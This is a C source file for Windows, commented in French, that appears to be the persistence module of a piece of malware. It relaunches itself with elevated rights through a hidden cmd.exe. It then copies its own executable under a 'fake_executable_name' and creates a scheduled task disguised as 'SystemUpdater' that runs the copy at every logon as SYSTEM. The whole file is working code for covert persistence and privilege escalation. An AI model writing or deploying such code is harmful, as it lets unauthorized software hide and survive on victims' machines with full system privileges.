#include <stdio.h>
#include <shellapi.h>
#include <windows.h>
#include <string.h>

int is_user_admin()
{
  BOOL isAdmin = FALSE;
  HANDLE hToken = NULL;

  if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
  {
    TOKEN_ELEVATION elevation;
    DWORD size;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size))
    {
      isAdmin = elevation.TokenIsElevated;
    }
    CloseHandle(hToken);
  }
  return isAdmin;
}

void ensure_admin_privileges()
{
  if (!is_user_admin())
  {
    SHELLEXECUTEINFO sei;
    ZeroMemory(&sei, sizeof(sei));

    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "runas";   // Demande les privilèges administratifs
    sei.lpFile = "cmd.exe"; // Redémarre le programme avec cmd
    char cmd[1024];

    // Prépare la commande pour relancer le programme avec élévation
    snprintf(cmd, 1024, "/c \"%s\"", GetCommandLineA());
    sei.lpParameters = cmd;
    sei.nShow = SW_HIDE;

    if (!ShellExecuteEx(&sei))
    {
      printf("Impossible de relancer le programme avec des privilèges administratifs. Code d'erreur : %lu\n", GetLastError());
      exit(EXIT_FAILURE);
    }

    // Attendre que le processus administrateur démarre
    if (sei.hProcess != NULL)
    {
      WaitForSingleObject(sei.hProcess, INFINITE);
      CloseHandle(sei.hProcess);
    }

    exit(EXIT_SUCCESS); // Quitte l'instance actuelle
  }
}

void set_persistance(char *softwareDataDirectory, char *current_executable_path, char *fake_executable_name)
{
  // Assure que le programme est exécuté avec des privilèges administratifs
  ensure_admin_privileges();

  SHELLEXECUTEINFO sei;

  ZeroMemory(&sei, sizeof(sei));

  sei.cbSize = sizeof(sei);
  sei.fMask = SEE_MASK_NOCLOSEPROCESS; // Assure que le processus ne se ferme pas immédiatement
  sei.lpVerb = "runas";                // Demande les privilèges administratifs
  sei.lpFile = "cmd.exe";              // Commande à exécuter
  char cmd[1024];

  // Préparation de la commande pour la persistance
  snprintf(cmd, 1024, "/c copy \"%s\" \"%s\\%s\" & schtasks /create /tn SystemUpdater /tr \"%s\\%s\" /sc onlogon /RU SYSTEM /F",
           current_executable_path, softwareDataDirectory, fake_executable_name, softwareDataDirectory, fake_executable_name);

  printf("Commande pour la persistance : %s\n", cmd);
  sei.lpParameters = cmd; // Paramètres de la commande
  sei.nShow = SW_HIDE;    // Masque la fenêtre de commande

  // Exécution de la commande avec élévation
  if (!ShellExecuteEx(&sei))
  {
    printf("Échec de l'exécution de la commande avec élévation. Code d'erreur : %lu\n", GetLastError());
    exit(EXIT_FAILURE);
  }

  // Attente de la fin du processus
  if (sei.hProcess != NULL)
  {
    WaitForSingleObject(sei.hProcess, INFINITE);
    CloseHandle(sei.hProcess);
  }
}